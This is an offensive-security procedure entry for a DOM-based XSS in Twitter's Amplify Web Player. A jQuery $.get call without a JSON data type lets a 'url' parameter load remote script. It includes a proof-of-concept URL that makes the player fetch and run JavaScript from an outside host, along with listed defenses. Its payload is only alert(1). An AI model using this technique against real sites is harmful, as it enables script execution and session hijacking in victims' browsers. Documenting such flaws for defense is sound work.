---
tags:
  - dom-xss
  - jquery
  - playlist-loader
type: procedure
tools:
  - '[[tools/Internet-Explorer]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:55.291Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 68a428c6-13f3-4c61-ae00-52b5ec2df54a
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# DOM-XSS-via-Unsafe-jQuery-get-in-Playlist-Loader

## Summary

This procedure exploits a DOM-based XSS vulnerability in the Twitter Amplify Web Player's playlist loader module by supplying a malicious URL parameter that loads and executes remote JavaScript instead of JSON data.

## Description

The vulnerability stems from the data/playlist/with_json_loader module using jQuery's $.get(e) without specifying dataType=JSON, allowing attackers to provide a URL pointing to a JavaScript file. When the player loads the playlist via the 'url' parameter in https://amp.twimg.com/amplify-web-player/prod/source.html, it executes the JS, leading to arbitrary code execution. This affects embedded players in Twitter timelines and can be used for session hijacking or further attacks.

## Requirements

1. Access to a web browser like Internet Explorer for testing due to CSP compatibility
2. Control over a remote server to host the malicious JS file (e.g., https://innerht.ml/vectors/js.php containing alert(1))
3. Public access to the Amplify Web Player URL

## Defense

Defensive measures and detection strategies:

- Specify dataType: 'json' in jQuery AJAX calls to prevent JS execution
- Validate and sanitize URL parameters against a whitelist of allowed domains
- Implement Content Security Policy (CSP) to block inline or remote script execution

## Objectives

1. Achieve arbitrary JavaScript execution in the player's context
2. Demonstrate potential for data exfiltration or DoS
3. Highlight risks in third-party embeds

## Instructions

### Step 1: Prepare Malicious JS Payload

**Context**: Host a simple JavaScript file that executes an alert to confirm XSS.

Create and host js.php or similar at a controllable domain:

```javascript
alert(1);
```

Upload to https://innerht.ml/vectors/js.php.

### Step 2: Craft and Access PoC URL

**Context**: Inject the malicious URL into the player's url parameter and trigger the load.

Navigate in Internet Explorer to:

```url
https://amp.twimg.com/amplify-web-player/prod/source.html?url=https://innerht.ml/vectors/js.php
```

Click the play button to load the playlist and execute the JS.

> The $.get call fetches and evaluates the JS file, popping the alert.

### Step 3: Verify Execution

**Context**: Confirm the payload ran without errors.

**Expected Output**: Alert dialog with '1' appears after clicking play.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Internet-Explorer]]

## Tags

- [[dom-xss]]
- [[twitter]]
- [[amplify]]
